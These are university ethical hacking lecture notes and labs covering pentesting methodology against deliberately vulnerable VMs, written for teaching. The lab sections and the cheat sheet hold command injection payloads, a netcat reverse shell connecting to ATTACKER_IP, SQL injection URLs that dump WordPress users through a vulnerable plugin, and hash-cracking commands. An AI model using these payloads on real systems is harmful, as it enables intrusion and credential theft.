# Week 1 - Introduction to Ethical Hacking & Penetration Testing

> **Module:** M31880 Ethical Hacking | **Lecturer:** Tobi Fajana | **UOP / Kaplan Singapore**

---

## Learning Outcomes

By the end of this week, you should be able to:

- Describe concepts and techniques for security testing
- Evaluate and implement a penetration testing methodology
- Outline tools and defences against cyber security attacks

---

## Table of Contents

1. [The Social Contract](#1-the-social-contract)
2. [What is Penetration Testing?](#2-what-is-penetration-testing)
3. [Key Concepts](#3-key-concepts)
4. [The CIA Triad](#4-the-cia-triad)
5. [Where Do We Conduct Assessments?](#5-where-do-we-conduct-assessments)
6. [Black Box vs Grey Box vs White Box](#6-black-box-vs-grey-box-vs-white-box)
7. [The Penetration Testing Process](#7-the-penetration-testing-process)
8. [Picking Your Exploit](#8-picking-your-exploit)
9. [Defences](#9-defences)
10. [Lab: Introduction to Pentesting & Linux](#10-lab-introduction-to-pentesting--linux)
11. [Lab: White-Box Approach (Source Code Review)](#11-lab-white-box-approach)
12. [Lab: Black-Box Approach (Command Injection)](#12-lab-black-box-approach)
13. [Additional Task: WordPress Plugin Exploitation via SQL Injection](#13-additional-task-wordpress-plugin-exploitation)
14. [Practice Questions](#14-practice-questions)
15. [Resources](#15-resources)

---

## 1. The Social Contract

Before we begin, understand the rules:

| Policy | What It Means |
|--------|--------------|
| **University Dignity and Respect Policy** | Treat everyone with respect |
| **Computer Misuse Act** | Unauthorised access to computer systems is a **criminal offence** |
| **University ICT Acceptable Use Policy** | Only use university systems for authorised purposes |
| **Mutual Respect and Fairness** | Collaborate ethically and honestly |

> **NEVER hack without written permission. This is non-negotiable.**

---

## 2. What is Penetration Testing?

Penetration testing is a **proactive, methodical process** of:

```
┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│   Identify   │──▶│   Analyse    │──▶│   Exploit    │──▶│  Recommend   │
│ Vulnerabili- │   │ Vulnerabili- │   │ Vulnerabili- │   │ Remediations │
│    ties      │   │    ties      │   │    ties      │   │              │
└──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘
```

### How Pentesting Differs from Other Concepts

| Concept | What It Is | Key Difference |
|---------|-----------|----------------|
| **Risk Assessment** | Identify & prevent problems | No active exploitation |
| **IT Audit** | Review infrastructure, policies, operations | Compliance-focused |
| **Vulnerability Assessment** | Scan for weaknesses | **No exploitation** |
| **Security Research** | Discover new vulnerabilities, critical analysis | Academic/research focus |
| **Red Teaming / Blue Teaming** | Simulated adversary vs defenders | Continuous, longer, more intense |
| **Penetration Testing** | Active exploitation within a defined scope & timeframe | Short fixed timeframe (1-8 weeks) |

---

## 3. Key Concepts

These terms will come up constantly throughout this module:

| Term | Definition | Where to Learn More |
|------|-----------|-------------------|
| **Weakness** | A flaw, limitation, or issue that could lead to exploitation. Not all weaknesses are exploitable but they may contribute | [MITRE CWEs](https://cwe.mitre.org) |
| **Vulnerability** | A **specific exploitable** weakness in an application or network | [NIST NVD](https://nvd.nist.gov), [CVE Details](https://cvedetails.com) |
| **Zero-Day** | A previously unknown/unpatched vulnerability that can be actively exploited | - |
| **Threat** | A potential danger to a system | [MITRE ATT&CK](https://attack.mitre.org), Cyber Kill Chain |
| **Risk** | **Risk = Threat x Vulnerability** - the potential impact and likelihood | [NIST CVSS](https://nvd.nist.gov/vuln-metrics/cvss), MITRE CWSS |
| **Exploit** | A method, technique, or tool used to take advantage of a vulnerability | [Exploit-DB](https://exploit-db.com), [WPScan](https://wpscan.com) |
| **Payload** | The component that delivers the malicious action (code, shell commands, SQL queries, etc.) | [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| **Shell** | A command-line interface that allows interaction with a compromised system | - |

---

## 4. The CIA Triad

In cybersecurity, we strive to protect **three core properties**:

```
            ┌───────────────────┐
            │  CONFIDENTIALITY  │
            │  Protecting info  │
            │  from disclosure  │
            └────────┬──────────┘
                     │
         ┌───────────┴───────────┐
         │                       │
┌────────▼──────────┐  ┌────────▼──────────┐
│    INTEGRITY      │  │   AVAILABILITY    │
│  Protecting info  │  │  Ensuring access  │
│  from modification│  │  when needed      │
└───────────────────┘  └───────────────────┘
```

Additional properties:
- **Non-repudiation** - An entity cannot deny an action they performed
- **Fairness** - No party has an advantage over the other

---

## 5. Where Do We Conduct Assessments?

| Attack Surface | Examples |
|---------------|----------|
| **Human** | Human errors, insider threats, social engineering, indifference |
| **Application** | Functions, storage, memory management, input validation |
| **Host** | Access control, memory, malware, backdoors, OS/Kernel |
| **Network** | Network mapping, services, data leaks, traffic interception |

---

## 6. Black Box vs Grey Box vs White Box

| Type | Knowledge Given | Description |
|------|----------------|-------------|
| **Black Box** | None or very little | Tester simulates a real external attacker |
| **Grey Box** | Partial (e.g. user credentials) | Most common in real-world engagements |
| **White Box** | Full disclosure (source code, architecture) | Tester acts like a developer reviewing code |

---

## 7. The Penetration Testing Process

```
┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐
│ 1. INFORMATION   │   │ 2. SCANNING &    │   │ 3. EXPLOITATION  │
│    GATHERING     │──▶│    ENUMERATION   │──▶│                  │
│                  │   │                  │   │  Use known       │
│ Passive: OSINT,  │   │  Open ports,     │   │  exploits, SQLi, │
│ Google Dorking,  │   │  service versions│   │  command inject, │
│ DNS, social media│   │  directories,    │   │  social eng.     │
│                  │   │  common weakness │   │                  │
│ Active: Nmap,    │   │                  │   │                  │
│ banner grabbing  │   │                  │   │                  │
└──────────────────┘   └──────────────────┘   └────────┬─────────┘
                                                       │
┌──────────────────┐   ┌──────────────────┐            │
│ 5. REPORTING &   │   │ 4. POST-         │            │
│    REMEDIATION   │◀──│    EXPLOITATION  │◀───────────┘
│                  │   │                  │
│ Risk analysis,   │   │ Privilege escal, │
│ documentation,   │   │ pivoting,        │
│ recommendations  │   │ persistence,     │
│                  │   │ covering tracks  │
└──────────────────┘   └──────────────────┘
```

### Phase 1: Information Gathering

**Passive** (no direct interaction):
- Open Source Intelligence (OSINT)
- Google Dorking (`site:target.com filetype:pdf`)
- Social media analysis
- DNS enumeration (WHOIS, DNS records)

**Active** (direct interaction with target):
- Port scanning with Nmap
- Banner grabbing & service enumeration
- Directory scanning with Gobuster

### Phase 2: Scanning & Enumeration

```bash
# Range scanning
nmap 192.168.56.1/24 -T5

# Banner grabbing and service enumeration
nmap -sV 192.168.56.101 -T5

# Scan ALL ports
nmap -sV 192.168.56.101 -T5 -p-

# Directory enumeration
gobuster dir -u http://target-ip -w ~/Downloads/directory-wordlist.txt
```

### Phase 3: Exploitation

- Social engineering and phishing
- Using known exploits (Exploit-DB, Metasploit)
- SQL injection via REST API
- Command injection

### Phase 4: Post-Exploitation

- **Privilege escalation** - from web admin to user to root
- **Pivoting** - moving to other systems on the network
- **Maintaining access/persistence** - SSH keys, startup services
- **Covering footprints** - cleaning `/var/logs`

### Phase 5: Reporting

- Risk analysis and documentation
- Recommendations for remediation
- Validation of fixes

---

## 8. Picking Your Exploit

When choosing which exploit to use, consider:

| Factor | Question to Ask |
|--------|----------------|
| **Reliability** | Can it only be attempted once? Will it crash the service? |
| **Complexity** | How easy is it to carry out? Does it require specialist knowledge? |
| **Impact** | What's the highest damage? Does it breach CIA? |
| **Detection** | What's the risk of being detected? How stealthy is it? |
| **Environment** | What programming language/tool is needed? Specific conditions? Protocols? |
| **Cost** | Financial cost? Time investment? Effort required? |

---

## 9. Defences

As ethical hackers, we also need to understand defences:

- **Firewalls** - Filter network traffic
- **Intrusion Detection Systems (IDS)** - Monitor for suspicious activity
- **Intrusion Prevention Systems (IPS)** - Automatically block threats
- **Regular testing** - Continuous security assessments
- **Effective policies** - Security governance
- **Regular effective training** - Security awareness
- **Patch management** - Keep systems updated
- **Threat intelligence** - Stay informed about emerging threats

---

## 10. Lab: Introduction to Pentesting & Linux

### Lab Environment Setup

1. Download the **attackbox machine** from [osboxes.org](https://osboxes.org)
2. Download the **EH vulnerable VM** from the LMS
3. Import both `.ova` files into VirtualBox (default settings)
4. Configure networking:

```
Adapter 1: NAT
Adapter 2: Host-Only (vboxnet0)
```

> Create a Host-Only network if needed: VirtualBox → Tools → Network Manager → Host-only networks → Create

5. Start both VMs. Login to attackbox: `osboxes.org` / `osboxes.org`

6. Install tools:
```bash
sudo apt update && sudo apt install nmap ncat gobuster
```

7. Test connectivity:
```bash
nmap -sV -T5 192.168.56.1/24
```

> You should see three IPs. `192.168.56.1` is your host machine. The vulnerable VM has **port 80** open.

### The Linux Environment

An OS has a **Kernel** (core) and a **Shell** (interface). The shell can be a GUI or CLI. Most pentesting tools use the CLI.

```bash
# Check your current shell
echo $0
echo $SHELL

# Common shell: /bin/bash (Bourne Again Shell)
```

**Command structure:**
```
command     options (optional)     arguments (optional)
ls          -l                     ~
```

### Essential Linux Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `pwd` | Print working directory | `pwd` |
| `cd` | Change directory | `cd /`, `cd ~` |
| `ls` | List files | `ls -la` |
| `cat` | View file contents | `cat /etc/passwd` |
| `man` | Manual pages | `man ls` |
| `whoami` | Current user | `whoami` |
| `id` | User ID and groups | `id` |
| `uname -r` | Kernel version | `uname -r` |
| `ps aux` | Running processes | `ps aux \| grep httpd` |
| `free -h` | Available memory | `free -h` |
| `df -H` | Disk space | `df -H` |
| `ifconfig` / `ip addr` | Network info / IP address | `ip addr` |
| `find` | Search for files | `find / -name *.sql` |
| `echo $PATH` | View executable paths | `echo $PATH` |
| `su -` | Switch user | `su - username` |
| `sudo usermod -aG sudo john` | Add user to sudo group | - |

### Linux Directory Structure

```
/           ← Root directory (lowest level)
├── /bin    ← Essential command binaries (ls, cat, cp)
├── /etc    ← Configuration files
│   ├── /etc/passwd   ← User account information
│   └── /etc/shadow   ← Password hashes (root only)
├── /home   ← User home directories
├── /var    ← Variable data (logs, web files)
│   └── /var/log      ← System logs
├── /tmp    ← Temporary files
└── /usr    ← User programs and data
```

> Any files in `/bin` can be run from anywhere because they're in the `$PATH`.

---

## 11. Lab: White-Box Approach

In white-box testing, you have **full access** to source code. You test as a developer.

### Source Code to Review

**HTML Form (index.html):**
```html
<h1>FREE DNS LOOKUP Utility</h1>
<form action="script.php" method="post">
    <label for="command">Enter a domain name:</label>
    <input type="text" id="command" name="command">
    <button type="submit">Check Status</button>
</form>
```

**PHP Backend (script.php):**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $command = $_POST["command"];
    $output = shell_exec("nslookup $command");
    echo "<pre>$output</pre>";
}
?>
```

### Identifying the Vulnerability

The `$command` variable from user input is passed **directly** into `shell_exec()`:

```php
$output = shell_exec("nslookup $command");
```

This is a **command injection** vulnerability. An attacker can append shell commands to the input.

### Lab Report Question

> **What improvements can be done to the above code? (Include in Report)**
>
> Research input sanitization and validation. Suggest improvements such as:
> - Input validation (whitelist allowed characters)
> - Use `escapeshellarg()` or `escapeshellcmd()`
> - Avoid passing user input directly to system commands
> - Implement allowlists for expected domain formats

---

## 12. Lab: Black-Box Approach

In black-box testing, you assume **no prior knowledge**. Information gathering is key.

### Step 1: Information Gathering

```bash
# Range scan to discover hosts
nmap 192.168.56.1/24 -T5

# Banner grabbing & service enumeration
nmap -sV 192.168.56.101 -T5

# Scan ALL ports
nmap -sV 192.168.56.101 -T5 -p-
```

### Step 2: Directory Scanning

```bash
# Find hidden directories and pages
gobuster dir -u http://192.168.56.101 -w ~/Downloads/directory-wordlist.txt
```

> **Lab Report Question:** What can you observe from the directory scan, aside from `/maintenance/`? List the directories/pages that accept user input.

### Step 3: Probing the Application

Visit `http://192.168.56.101/maintenance/` in your browser.

1. Enter `google.com` in the DNS lookup tool
2. Compare output with terminal: `nslookup google.com`
3. The results look the same - we can guess `nslookup` is being used in a Linux environment

### Step 4: Fuzzing

Test what input the application accepts:

```
fgpo93=5"$£$%$^57~@&&     ← What happens?
fgpo93=5"$£$%$^57~@       ← Remove && - what changes?
```

The app accepts **all user input** - time to try command injection.

### Step 5: Command Injection

```bash
# List files in current directory
google.com && ls

# Find current user
google.com && whoami

# View user accounts
google.com; cat /etc/passwd
```

### Step 6: Reverse Shell

A reverse shell gives you a **stable, interactive** connection to the target.

**On your attack machine (listener):**
```bash
nc -lvnp 4443
```

**In the maintenance page text box:**
```
google.com; ncat 192.168.56.YOUR_IP 4443 -e /bin/bash
```

**Spawn an interactive TTY shell:**
```bash
# Check if Python is available
which python python3

# Spawn interactive shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export SHELL=bash
export TERM=xterm-256color
```

### Lab Report Question

> **What is the username and password for the blog SQL database? HINT: wp-config.php (Include in Report)**
>
> Use `find / -name wp-config.php` and `cat` the file to find database credentials.

---

## 13. Additional Task: WordPress Plugin Exploitation

### Setup

Download the VM: `https://download.vulnhub.com/hackerfest/HF2019-Linux.ova`
- Use only 1 adapter: **Host-Only**

### HTTP Enumeration

```bash
# Scan for common web vulnerabilities
nikto -h ip-address

# WordPress-specific scanning
wpscan --url ip-address
```

### SQL Injection via WP Google Maps REST API

The `wp-google-maps` plugin is outdated and has a known vulnerability: **unsanitised SELECT statements on the WordPress REST API**.

```
# View REST API routes
http://ip-address/?rest_route=/

# Access the vulnerable plugin endpoint
http://ip-address/?rest_route=/wpgmza/v1/markers&filter={}

# Select specific fields
http://ip-address/?rest_route=/wpgmza/v1/markers&filter={}&fields=id

# Test SQL injection:
&fields=*                    ← Catch-all: retrieve everything
&fields=1=1                  ← Should return true (1)
&fields=1=0                  ← Should return false (0)

# Extract database name
http://ip-address/?rest_route=/wpgmza/v1/markers&filter={}&fields=database()-- -

# List all tables
http://ip-address/?rest_route=/wpgmza/v1/markers&filter={}&fields=* from information_schema.tables-- -

# Extract WordPress users table
http://ip-address/?rest_route=/wpgmza/v1/markers&filter={}&fields=* from wp_users-- -
```

### Cracking Password Hashes

```bash
# Download wordlist
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Save extracted hashes to a file
echo "HASH_HERE" > hashfile

# Crack with hashcat
hashcat -m 400 -a 0 hashfile rockyou.txt
```

> **Bonus Challenge:** Can you escalate privileges to root?

---

## 14. Practice Questions

20 multiple-choice questions to test your understanding:

<details>
<summary><strong>Click to show questions and answers</strong></summary>

**Q1.** What is the primary function of penetration testing?
- a. To create software applications
- b. **To find and exploit security vulnerabilities** ✓
- c. To design network infrastructure
- d. To manage IT operations

**Q2.** What Linux command is used to look up the IP address of a domain?
- a. IP-pinger
- b. connect
- c. **nslookup** ✓
- d. trace

**Q3.** Which Nmap option is used to perform service version detection?
- a. -sP
- b. **-sV** ✓
- c. -sZ
- d. -sS

**Q4.** Which command adds a user named John to the sudo group?
- a. sudo adduser john
- b. **sudo usermod -aG sudo john** ✓
- c. sudo newuser john sudo
- d. sudo setuser john sudo

**Q5.** What is the purpose of the `echo $0` command?
- a. Displays the current user
- b. **Displays the shell type the user is currently in** ✓
- c. Changes the current shell
- d. Configures shell settings

**Q6.** What does the command `whoami` return?
- a. Current System Version
- b. **The current user's name** ✓
- c. The current user's roles and privileges
- d. List of users

**Q7.** In Linux, where are user password hashes typically stored?
- a. /etc/passwords
- b. /etc/passwd
- c. /etc/users
- d. **/etc/shadow** ✓

**Q8.** What is the purpose of the `unshadow` tool?
- a. **To combine /etc/passwd and /etc/shadow for easier cracking** ✓
- b. To unhash password hashes in the /etc/shadow file
- c. To encrypt password files
- d. To create backup of user password hashes

**Q9.** Which command will list all files ending with `.sql` in the root directory?
- a. **find / -name *.sql -exec ls -l {}** ✓
- b. whereis / -type f -name *.sql
- c. search / -type f -name *.sql
- d. grep / -pattern *.sql

**Q10.** What is banner grabbing?
- a. Physically securing server rooms
- b. Pulling configuration banners from devices
- c. **Collecting version information from running services** ✓
- d. Grabbing user credentials via phishing

**Q11.** Which tool detects common vulnerabilities in WordPress?
- a. nikto
- b. **wpscan** ✓
- c. WordPress Scanner
- d. gobuster

**Q12.** How do you switch to a new user in Linux?
- a. switch user
- b. change user
- c. **su -** ✓
- d. user change

**Q13.** What is a 'honeypot' in network security?
- a. A type of firewall
- b. **A tool that simulates network services on your computer's ports** ✓
- c. A software vulnerability
- d. A network fault detection tool

**Q14.** Which is a legal implication of unauthorised pentesting?
- a. Increased reputation
- b. **Potential civil and criminal liabilities due to unauthorised access** ✓
- c. Improved team collaboration
- d. Faster IT deployment

**Q15.** You find open remote access ports during an Nmap scan. Next step?
- a. Close the ports immediately
- b. **Perform banner grabbing to determine exact services and versions** ✓
- c. Report and recommend closure without analysis
- d. Ignore and continue scanning

**Q16.** Which command views running processes and filters for "httpd"?
- a. **ps aux | grep httpd** ✓
- b. ps -ef | find "httpd"
- c. service --status-all | grep httpd
- d. procmon --all | grep httpd

**Q17.** Which tools are commonly used in pentesting? (Select all that apply)
- a. **Metasploit Framework** ✓
- b. **Nikto** ✓
- c. LaTeX
- d. VulnScan
- e. exiftool

**Q18.** Where are details about all tables in a MySQL database stored?
- a. **In the information_schema.tables table** ✓
- b. In the information.schemas table
- c. In the mysql.tables table
- d. In the atlas_users table

**Q19.** Which tools are used for offline password attacks? (Select all)
- a. **John** ✓
- b. **Hashcat** ✓
- c. Hydra
- d. nslookup

**Q20.** Which is an example of an offline password attack?
- a. Brute-forcing a login form on a website
- b. **Using a stolen database of hashed passwords and cracking them without network access** ✓
- c. Phishing employees to reveal passwords
- d. Intercepting passwords via man-in-the-middle

</details>

---

## 15. Resources

### TryHackMe Rooms (Recommended)

| Room | Description |
|------|-------------|
| [Tutorial](https://tryhackme.com/room/tutorial) | Getting started with TryHackMe |
| [OpenVPN](https://tryhackme.com/room/openvpn) | Connect to the TryHackMe network |
| [Intro to Research](https://tryhackme.com/room/introtoresearch) | Research skills for pentesters |
| [Nmap](https://tryhackme.com/room/furthernmap) | Master Nmap scanning |
| [Metasploit Introduction](https://tryhackme.com/room/metasploitintro) | Learn Metasploit basics |
| [Blue](https://tryhackme.com/room/blue) | Exploit EternalBlue (beginner-friendly) |

### Pentesting Methodologies

- [OSSTMM](https://www.isecom.org/OSSTMM.3.pdf) - Open Source Security Testing Methodology Manual
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Web Application Security
- [PTES](http://www.pentest-standard.org) - Penetration Testing Execution Standard
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final) - Technical Guide to Information Security Testing

### Video Resources

- Lab Demonstration: Exploiting WP Google Maps Plugin via SQL Injection (LMS)
- Video Solution: Basic User Creation and Linux Password Cracking (LMS)
- NetworkChuck - Ethical Hacking Course (YouTube)
- The Cyber Mentor - Practical Ethical Hacking (YouTube)

### Recommended Books

- *The Hacker Playbook 3* - Peter Kim
- *Web Application Security: Exploitation and Countermeasures*
- *Exploiting Software: How To Break Code* - Gary McGraw & Greg Hoglund
- *Sockets, Shellcode, Porting, and Coding* - James C Foster

---

## Quick Reference Card

```
┌──────────────────────────────────────────────────────────────┐
│                    WEEK 1 CHEAT SHEET                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  HOST DISCOVERY          nmap -sV -T5 192.168.56.1/24       │
│  PORT SCAN               nmap -sV 192.168.56.101 -T5        │
│  ALL PORTS               nmap -sV 192.168.56.101 -T5 -p-    │
│  DIRECTORY SCAN          gobuster dir -u http://target       │
│                            -w directory-wordlist.txt         │
│  WEB VULN SCAN           nikto -h http://target              │
│  WORDPRESS SCAN          wpscan --url http://target          │
│                                                              │
│  REVERSE SHELL LISTENER  nc -lvnp 4443                      │
│  CONNECT BACK            ncat ATTACKER_IP 4443 -e /bin/bash │
│  INTERACTIVE SHELL       python3 -c 'import pty;            │
│                            pty.spawn("/bin/bash")'           │
│                                                              │
│  FIND FILES              find / -name *.sql                  │
│  VIEW USERS              cat /etc/passwd                     │
│  VIEW HASHES             cat /etc/shadow                     │
│  CURRENT USER            whoami && id                        │
│  CRACK HASHES            hashcat -m 400 -a 0 hash wordlist  │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

[Back to Course Home](../README.md) | [Week 2: Information Gathering →](../Week_02/README.md)
